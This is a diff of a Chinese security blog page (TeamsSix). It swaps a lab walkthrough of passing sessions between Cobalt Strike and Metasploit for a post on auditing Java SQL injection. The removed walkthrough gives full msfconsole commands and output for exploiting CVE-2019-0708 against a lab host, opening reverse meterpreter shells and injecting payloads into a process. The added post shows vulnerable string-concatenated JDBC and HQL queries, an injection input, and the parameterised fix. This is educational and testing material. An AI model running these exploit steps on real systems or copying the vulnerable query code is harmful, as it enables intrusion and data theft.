@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="【经验总结】CS与MSF之间的会话传递, TeamsSix">
+    <meta name="keywords" content="【代码审计】SQL 注入, TeamsSix">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -29,7 +29,7 @@
 </script>
 
 
-    <title>【经验总结】CS与MSF之间的会话传递 | TeamsSix</title>
+    <title>【代码审计】SQL 注入 | TeamsSix</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -271,12 +271,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_19-11-30.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://teamssix.oss-cn-hangzhou.aliyuncs.com/202111172027760.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">【经验总结】CS与MSF之间的会话传递</h1>
+                    <h1 class="description center-align post-title">【代码审计】SQL 注入</h1>
                 </div>
             </div>
         </div>
@@ -392,16 +392,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Cobalt-Strike/">
-                                <span class="chip bg-color">Cobalt Strike</span>
+                            <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+                                <span class="chip bg-color">学习笔记</span>
                             </a>
                         
-                            <a href="/tags/MSF/">
-                                <span class="chip bg-color">MSF</span>
-                            </a>
-                        
-                            <a href="/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">
-                                <span class="chip bg-color">经验总结</span>
+                            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                                <span class="chip bg-color">代码审计</span>
                             </a>
                         
                     </div>
@@ -412,8 +408,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="post-category">
-                                经验总结
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                代码审计
                             </a>
                         
                     </div>
@@ -425,28 +421,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-01-29
+                    2021-11-17
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-08-04
+                    2021-11-17
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.6k
+                    913
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    7 分
+                    3 分
                 </div>
                 
 
@@ -469,175 +465,61 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>众所周知，Cobalt Strike 的前身是 Armitage，而 Armitage 又可以理解为 Metasploit  Framework 的图形界面版，因此 Cobalt Strike 与 Metasploit  Framework 在很多地方都是兼容的，所以我们便可以将 Metasploit  Framework 攻击产生的会话传递到 Cobalt Strike 上，同样的 Cobalt Strike 的会话也能够传递到 Metasploit  Framework</p>
-<p><strong>Metasploit  Framework 会话传递到 Cobalt Strike 上整体过程如下：</strong></p>
-<p>1、Metasploit Framework 调用攻击载荷，这里调用的是喜闻乐见的 CVE-2019-0708</p>
-<p>2、Metasploit Framework 发起攻击，获取会话</p>
-<p>3、Cobalt Strike 新建一个 Beacon，这里使用的是 HTTPS Beacon</p>
-<p>4、最后，在 Metasploit Framework 上调用 exploit/windows/local/payload_inject 模块</p>
-<p>5、在该模块上配置与 Cobalt Strike 上为同样类型的 payload，即 HTTPS Payload，设置 Cobalt Strike 服务器的 IP 和 端口后运行即可</p>
-<p><strong>Cobalt Strike 会话传递到 Metasploit  Framework 上整体过程如下：</strong></p>
-<p>1、首先，Cobalt Strike 需要获得一个会话，这里直接采用 Scripted Web Delivery（S）的方式使靶机上线</p>
-<p>2、接着，Metasploit Framework 调用 exploit/multi/handler 模块</p>
-<p>3、在该模块上配置 HTTP Payload，为该 payload 的 IP 和 端口设置成 Metasploit Framework 所在主机 IP，端口自定义即可</p>
-<p>4、 之后运行该模块</p>
-<p>5、在 Cobalt Strike 上创建一个 Foreign HTTP 的监听，监听 IP 和端口设置成刚才 Metasploit Framework 上所监听的 IP 和端口</p>
-<p>7、接着在 Cobalt Strike 上右击选择要传递的会话，找到 Spawn 选项，选择刚刚创建的监听器即可</p>
+                <h1 id="0x01-JDBC-拼接不当造成-SQL-注入"><a href="#0x01-JDBC-拼接不当造成-SQL-注入" class="headerlink" title="0x01 JDBC 拼接不当造成 SQL 注入"></a>0x01 JDBC 拼接不当造成 SQL 注入</h1><p>JDBC 有两种方法执行 SQL 语句，分别为 PrepareStatement 和 Statement，两个方法的区别在于 PrepareStatement 会对 SQL 语句进行预编译，而 Statement 在每次执行时都需要编译，会增大系统开销。</p>
+<p>理论上 PrepareStatement 的效率和安全性会比 Statement 好，但不意味着就不会存在问题。</p>
+<p>以下是一个使用 Statement 执行 SQL 语句的示例</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"select * from user where id ="</span><span class="token operator">+</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Statement Demo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"SQL: "</span><span class="token operator">+</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+    <span class="token class-name">Statement</span> st <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">createStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token class-name">ResultSet</span> rs <span class="token operator">=</span> st<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里如果输入的 id 为 1 or 1 = 2，那么 SQL 语句就会被拼接为 select * from user where id = 1 or 1 = 2，改变了想要查询 id = 1 的语义。 </p>
+<p>PreqareStatement 方法支持使用 ? 对变量位进行占位，在预编译阶段填入相应的值会构造出完整的 SQL 语句，从而避免 SQL 注入的产生。</p>
+<p>但开发有时为了便利，会直接采取拼接的方式构造 SQL 语句，这样一来依然会存在 SQL 注入，如下代码所示。</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"select * from user where id ="</span><span class="token operator">+</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"prepareStatement Demo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"SQL: "</span><span class="token operator">+</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+    <span class="token class-name">PreparedStatement</span> pst <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token class-name">ResultSet</span> rs <span class="token operator">=</span> pst<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>此时如果使用 or 1 = 1 仍然可以判断存在 SQL 注入，但是如果使用 ? 作为占位符，填入的字段的值就会进行严格的类型检查，就可以有效的避免 SQL 注入的产生，如下代码所示。</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">PrintWriter</span> out <span class="token operator">=</span> resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"prepareStatement Demo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"select * from user where id = ?"</span><span class="token punctuation">;</span>
+out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+    <span class="token class-name">PreparedStatement</span> pstt <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">// 参数已经强制要求是整型</span>
+    pstt<span class="token punctuation">.</span><span class="token function">setInt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token class-name">ResultSet</span> rs <span class="token operator">=</span> pstt<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">while</span> <span class="token punctuation">(</span>rs<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="0x02-框架使用不当造成-SQL-注入"><a href="#0x02-框架使用不当造成-SQL-注入" class="headerlink" title="0x02 框架使用不当造成 SQL 注入"></a>0x02 框架使用不当造成 SQL 注入</h1><p>通常框架底层已经实现了对 SQL 注入的防御，但是如果在开发未能恰当的使用框架的情况下，依然会存在 SQL 注入的风险。</p>
+<h2 id="1、MyBatis-框架"><a href="#1、MyBatis-框架" class="headerlink" title="1、MyBatis 框架"></a>1、MyBatis 框架</h2><p>MyBatis 的思想是将 SQL 语句编入配置文件中，避免 SQL 语句在代码中大量出现，方便对 SQL 语句的修改和配置。</p>
+<p>MyBatis 使用 parameterType 向 SQL 语句传参，在 SQL 引用传参的时候可以使用 #{} 和 ${} 两种方式，两种方式区别如下：</p>
+<p>${}：SQL 拼接符号，直接将输入的语句拼接到 SQL 语句里，想避免 SQL 注入问题需要手动添加过滤</p>
+<p>#{}：占位符号，在对数据解析时会自动将输入的语句前后加上单引号从而避免 SQL 注入</p>
+<p>也就是说在 MyBatis 框架中，如果使用了 ${} 方法，同时又没有进行过滤就会产生 SQL 注入，而使用 #{} 方法时可以避免 SQL 注入。</p>
+<h2 id="2、Hibernate-框架"><a href="#2、Hibernate-框架" class="headerlink" title="2、Hibernate 框架"></a>2、Hibernate 框架</h2><p>Hibernate 是现今主流的 Java 数据库持久化框架，采用 Hibernate 查询语句（HQL）注入。</p>
+<p>HQL 查询语句来自 Hibernate 引擎进行解析，因此产生的错误可能来自数据库，也有可能来自 Hibernate 引擎。 </p>
+<p>HQL 和 SQL 的区别：</p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202111172027760.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p>HQL 注入和 SQL 注入的成因都一样，使用拼接 HQL 语句的写法可能会导致 SQL 注入</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Query</span> query <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">createQuery</span><span class="token punctuation">(</span><span class="token string">"from User where name='"</span><span class="token operator">+</span>queryString<span class="token operator">+</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>但是受语法影响，HQL注入在漏洞利用上有一定的限制，比如不能利用联合查询、不能跨库查表、执行命令等。</p>
+<p>对于 Hibernate 的注入，这里只作为简单了解一下，平时代审的时候注意一下即可。</p>
 <blockquote>
-<p>环境信息：</p>
-<p>攻击 IP：192.168.175.200 （Cobalt Strike 服务端、Metasploit Framework 所在主机）</p>
-<p>靶机 IP：192.168.175.177 （一台有 CVE-2019-0708 漏洞的 Win7 SP1 64 位靶机）</p>
-</blockquote>
-<h1 id="0x01-Metasploit-Framework-会话传递到-Cobalt-Strike"><a href="#0x01-Metasploit-Framework-会话传递到-Cobalt-Strike" class="headerlink" title="0x01 Metasploit Framework 会话传递到 Cobalt Strike"></a>0x01 Metasploit Framework 会话传递到 Cobalt Strike</h1><h2 id="1、Cobalt-Strike-上的操作"><a href="#1、Cobalt-Strike-上的操作" class="headerlink" title="1、Cobalt Strike 上的操作"></a>1、Cobalt Strike 上的操作</h2><p>首先来到 Cobalt Strike 目录下，启动 Cobalt Strike 服务端</p>
-<pre class="line-numbers language-none"><code class="language-none">.&#x2F;teamserver yourip yourpassword<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>之后打开 Cobalt Strike 客户端进行连接</p>
-<pre class="line-numbers language-none"><code class="language-none">.&#x2F;start.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>输入服务端密码连接上之后，点击 Cobalt Strike –&gt; Listeners 打开 Listeners 界面，点击下方的 Add 按钮，输入 Beacon 名称，这里选择的是 HTTPS Beacon，添加上主机 IP，点击保存，即可创建一个 HTTPS Beacon</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-24_20-07-57.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
-<h2 id="2、Metasploit-Framework-上的操作"><a href="#2、Metasploit-Framework-上的操作" class="headerlink" title="2、Metasploit Framework 上的操作"></a>2、Metasploit Framework 上的操作</h2><p>首先，打开 Metasploit Framework</p>
-<pre class="line-numbers language-none"><code class="language-none">msfconsole <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>调用 CVE-2019-0708 模块</p>
-<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>设置靶机 IP</p>
-<pre class="line-numbers language-none"><code class="language-none">set rhost 192.168.175.177<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>设置 Payload</p>
-<pre class="line-numbers language-none"><code class="language-none">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp
-set lhost 192.168.175.200<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>发起攻击</p>
-<pre class="line-numbers language-none"><code class="language-none">exploit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>整体过程如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">root@kali:~# msfconsole
-
-msf5 &gt; use exploit&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce
-
-msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set rhost 192.168.175.177
-rhost &#x3D;&gt; 192.168.175.177
-
-msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp
-payload &#x3D;&gt; windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp
-
-msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set lhost 192.168.175.200
-lhost &#x3D;&gt; 192.168.175.200
-
-msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; exploit
-[*] Started reverse TCP handler on 192.168.175.200:4444 
-[*] 192.168.175.177:3389 - Using auxiliary&#x2F;scanner&#x2F;rdp&#x2F;cve_2019_0708_bluekeep as check
-[+] 192.168.175.177:3389  - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
-[*] 192.168.175.177:3389  - Scanned 1 of 1 hosts (100% complete)
-[*] 192.168.175.177:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8028608000, Channel count 1.
-[!] 192.168.175.177:3389 - &lt;---------------- | Entering Danger Zone | ----------------&gt;
-[*] 192.168.175.177:3389 - Surfing channels ...
-[*] 192.168.175.177:3389 - Lobbing eggs ...
-[*] 192.168.175.177:3389 - Forcing the USE of FREE&#39;d object ...
-[!] 192.168.175.177:3389 - &lt;---------------- | Leaving Danger Zone | ----------------&gt;
-[*] Sending stage (206403 bytes) to 192.168.175.177
-[*] Meterpreter session 4 opened (192.168.175.200:4444 -&gt; 192.168.175.177:49167) at 2020-07-26 05:57:22 -0400
-
-meterpreter &gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_17-57-47.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
-<h2 id="3、开始传递会话"><a href="#3、开始传递会话" class="headerlink" title="3、开始传递会话"></a>3、开始传递会话</h2><p>首先，backgroud 会话</p>
-<pre class="line-numbers language-none"><code class="language-none">background<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>调用 payload_inject 模块</p>
-<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>设置 HTTPS Payload</p>
-<pre class="line-numbers language-none"><code class="language-none">set payload windows&#x2F;meterpreter&#x2F;reverse_https<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>设置 lhost 和 lport 为 Cobalt Strike 的监听 IP 与端口</p>
-<pre class="line-numbers language-none"><code class="language-none">set lhost 192.168.175.200
-set lport 443<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>设置 DisablePayloadHandler 为 True，此选项会让 Metasploit Framework 避免在其内起一个 handler 来服务你的 payload 连接，也就是告诉 Metasploit Framework 说我们已经建立了监听器，不必再新建监听器了。</p>
-<pre class="line-numbers language-none"><code class="language-none">set DisablePayloadHandler True<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>（可选）设置 PrependMigrate 为 True，此选项让 Metasploit Framework 前置 shellcode 在另一个进程中运行 payload stager，如果被利用的应用程序崩溃或被用户关闭，这会帮助 Beacon 会话存活。</p>
-<pre class="line-numbers language-none"><code class="language-none">set PrependMigrate True<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>设置要传递的会话 session，如果不知道自己的 session id，可以通过 sessions -l 查看，我这里待传递的 session id 为 4</p>
-<pre class="line-numbers language-none"><code class="language-none">set session 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>开始会话传递</p>
-<pre class="line-numbers language-none"><code class="language-none">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>整体过程如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">msf5 &gt; background 
-[*] Backgrounding session 4...
-
-msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject
-
-msf5 exploit(windows&#x2F;local&#x2F;payload_inject) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_https
-payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_https
-
-msf5 exploit(windows&#x2F;local&#x2F;payload_inject) &gt; set lhost 192.168.175.200
-lhost &#x3D;&gt; 192.168.175.200
-
-msf5 exploit(windows&#x2F;local&#x2F;payload_inject) &gt; set lport 443
-lport &#x3D;&gt; 443
-
-msf5 exploit(windows&#x2F;local&#x2F;payload_inject) &gt; set DisablePayloadHandler True
-DisablePayloadHandler &#x3D;&gt; true
-
-msf5 exploit(windows&#x2F;local&#x2F;payload_inject) &gt; set PrependMigrate True
-PrependMigrate &#x3D;&gt; True
-
-msf5 exploit(windows&#x2F;local&#x2F;payload_inject) &gt;  set session 4
-session &#x3D;&gt; 4
-
-msf5 exploit(windows&#x2F;local&#x2F;payload_inject) &gt; run
-[*] Running module against WIN-T0UES7KBMJ5
-[*] Spawned Notepad process 544
-[*] Injecting payload into 544
-[*] Preparing &#39;windows&#x2F;meterpreter&#x2F;reverse_https&#39; for PID 544<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_19-11-30.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
-<p>此时，来到 Cobalt Strike 下已经可以看到传递过来的会话了</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-08-39.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
-<h1 id="0x02-Cobalt-Strike-会话传递到-Metasploit-Framework"><a href="#0x02-Cobalt-Strike-会话传递到-Metasploit-Framework" class="headerlink" title="0x02 Cobalt Strike 会话传递到 Metasploit Framework"></a>0x02 Cobalt Strike 会话传递到 Metasploit Framework</h1><h2 id="1、Cobalt-Strike-上的操作-1"><a href="#1、Cobalt-Strike-上的操作-1" class="headerlink" title="1、Cobalt Strike 上的操作"></a>1、Cobalt Strike 上的操作</h2><p>与上述 Cobalt Strike 的操作步骤一样，这里先创建一个 HTTPS Beacon，接下来创建一个 Powershell 类型的 Scripted Web Delivery（S）</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-27-02.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10">为了使 Cobalt Strike 获得一个会话，需要复制创建好的命令，并在靶机上运行，此时靶机便会上线了</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-30-31.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
-<h2 id="2、Metasploit-Framework-上的操作-1"><a href="#2、Metasploit-Framework-上的操作-1" class="headerlink" title="2、Metasploit Framework 上的操作"></a>2、Metasploit Framework 上的操作</h2><p>首先，在 Metasploit Framework 上调用 handler 模块</p>
-<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handler<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>设置 HTTP Payload</p>
-<pre class="line-numbers language-none"><code class="language-none">set payload windows&#x2F;meterpreter&#x2F;reverse_http
-set lhost 192.168.175.200
-set lport 4480<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p>运行该模块</p>
-<pre class="line-numbers language-none"><code class="language-none">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>整体过程如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">msf5 &gt; use exploit&#x2F;multi&#x2F;handler
-
-msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_http
-payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_http
-
-msf5 exploit(multi&#x2F;handler) &gt; set lhost 192.168.175.200
-lhost &#x3D;&gt; 192.168.175.200
-
-msf5 exploit(multi&#x2F;handler) &gt; set lport 4480
-lport &#x3D;&gt; 4480
-
-msf5 exploit(multi&#x2F;handler) &gt; run
-[*] Started HTTPS reverse handler on http:&#x2F;&#x2F;192.168.175.200:4480<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="3、开始会话传递"><a href="#3、开始会话传递" class="headerlink" title="3、开始会话传递"></a><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-35-45.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10">3、开始会话传递</h2><p>在 Cobalt Strike 上先创建一个  Foreign HTTP 监听，IP 和 端口设置成上面 Metasploit Framework 所设置 handler 模块的端口和 IP</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-39-58.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
-<p>之后在 Cobalt Strike 上右击待传递的会话选择 Spawn ，选择刚刚创建的 Foreign HTTP 监听</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-54-23.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
-<p>来到 Metasploit Framework 便能够看到会话已经传递过来了</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-57-35.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
-<blockquote>
-<p>更多信息欢迎关注我的微信公众号：TeamsSix</p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://www.redhatzone.com/ask/article/1448.html">https://www.redhatzone.com/ask/article/1448.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.redhatzone.com/ask/article/1448.html">https://blog.csdn.net/qq_36594628/article/details/119461996</a></p>
+<p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p>
 </blockquote>
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>
 
@@ -666,7 +548,7 @@ msf5 exploit(multi&#x2F;handler) &gt; run
                     </i>
                 </span>
                 <span class="reprint-info">
